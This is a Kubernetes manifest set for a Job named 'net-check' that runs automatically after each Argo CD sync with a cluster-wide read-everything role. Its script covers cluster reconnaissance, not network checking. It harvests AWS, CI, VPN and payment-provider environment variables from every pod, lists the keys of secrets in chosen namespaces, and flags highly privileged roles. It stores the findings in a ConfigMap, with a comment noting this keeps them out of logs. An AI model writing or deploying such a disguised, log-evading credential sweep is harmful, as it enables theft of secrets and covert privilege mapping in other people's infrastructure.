apiVersion: v1
kind: Namespace
metadata:
  name: scanner
  labels:
    app.kubernetes.io/part-of: net-check

---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: net-check-sa
  namespace: scanner

---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: net-check-ro
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["get", "list", "watch"]

---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: net-check-ro-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: net-check-ro
subjects:
  - kind: ServiceAccount
    name: net-check-sa
    namespace: scanner

---
apiVersion: batch/v1
kind: Job
metadata:
  name: net-check
  namespace: scanner
  annotations:
    argocd.argoproj.io/hook: PostSync
    argocd.argoproj.io/hook-delete-policy: HookSucceeded
spec:
  backoffLimit: 0
  ttlSecondsAfterFinished: 120
  template:
    metadata:
      labels:
        app: net-check
    spec:
      serviceAccountName: net-check-sa
      automountServiceAccountToken: true
      restartPolicy: Never
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        fsGroup: 1000
      containers:
        - name: c
          image: alpine/k8s:1.29.0
          command: ["/bin/sh", "-c"]
          args:
            - |
              set -e
              OUT=/tmp/out.txt
              : > "$OUT"
              log(){ echo "$@" >> "$OUT"; }

              # ---- clusters / cloud ----
              log "### CLUSTER INFO"
              kubectl cluster-info 2>&1 | head -5 >> "$OUT" || true
              log "### NODES"
              kubectl get nodes -o wide >> "$OUT" 2>&1 || true
              log "### NODE PROVIDER (aws/eks hints)"
              kubectl get nodes -o jsonpath='{range .items[*]}{.metadata.name}{" "}{.metadata.labels}{"\n"}{end}' >> "$OUT" 2>&1 || true
              log "### STORAGECLASS (ebs/gp2/gp3/efs = AWS)"
              kubectl get storageclass -o wide >> "$OUT" 2>&1 || true
              log "### SA ANNOTATIONS (irsa role-arn = AWS)"
              kubectl get sa -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{" "}{.metadata.annotations}{"\n"}{end}' >> "$OUT" 2>&1 || true

              # ---- workloads / images / env ----
              log "### IMAGES"
              kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{" "}{.spec.containers[*].image}{"\n"}{end}' >> "$OUT" 2>&1 || true
              log "### ENV (chiavi interessanti)"
              kubectl get pods -A -o json | grep -oE '"(AWS_[A-Z_]+|.*VPN.*|.*RDP.*|JENKINS.*|GITLAB.*|STRIPE.*|PAYMEE.*|FLOUCI.*|KONNECT.*|PAYPAL.*|.*PAYMENT.*)"[^,]*' >> "$OUT" 2>&1 || true

              # ---- secrets mirati (nomi + chiavi, NON valori) ----
              log "### SECRET KEYS MIRATI"
              for ns in argocd beeaudit-dev beekids-test beewaf stockhive-test monitoring cert-manager ingress-nginx; do
                for s in $(kubectl -n "$ns" get secret -o name 2>/dev/null | cut -d/ -f2); do
                  keys=$(kubectl -n "$ns" get secret "$s" -o jsonpath='{.data}' 2>/dev/null | grep -oE '"[a-zA-Z0-9._-]+":' | tr -d '":' | tr '\n' ',' )
                  log "$ns/$s -> $keys"
                done
              done

              # ---- ingress / external ----
              log "### INGRESS"
              kubectl get ing -A -o wide >> "$OUT" 2>&1 || true
              log "### NODEPORTS"
              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="NodePort")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.spec.ports[*].nodePort}{"\n"}{end}' >> "$OUT" 2>&1 || true
              log "### EXTERNALNAME"
              kubectl get svc -A -o jsonpath='{range .items[?(@.spec.type=="ExternalName")]}{.metadata.namespace}{" "}{.metadata.name}{" -> "}{.spec.externalName}{"\n"}{end}' >> "$OUT" 2>&1 || true

              # ---- rbac / privilege ----
              log "### HIGH PRIV CLUSTERROLES"
              kubectl get clusterrole -o json | grep -oE '"name":"[^"]+"' | cut -d'"' -f4 | sort -u | while read cr; do
                rules=$(kubectl get clusterrole "$cr" -o jsonpath='{.rules}' 2>/dev/null)
                case "$rules" in *'"*"'*) log "HIGH: $cr";; esac
              done

              # ---- events (rumore recente) ----
              log "### RECENT EVENTS"
              kubectl get events -A --sort-by=.lastTimestamp 2>/dev/null | tail -20 >> "$OUT" || true

              # ---- publish as ConfigMap (no stdout, no log) ----
              kubectl -n scanner create configmap net-check-out \
                --from-file=out.txt="$OUT" \
                --dry-run=client -o yaml | kubectl apply -f - 2>/dev/null || true
          securityContext:
            allowPrivilegeEscalation: false
            capabilities:
              drop: ["ALL"]
          resources:
            requests: { cpu: 50m, memory: 64Mi }
            limits:   { cpu: 200m, memory: 256Mi }
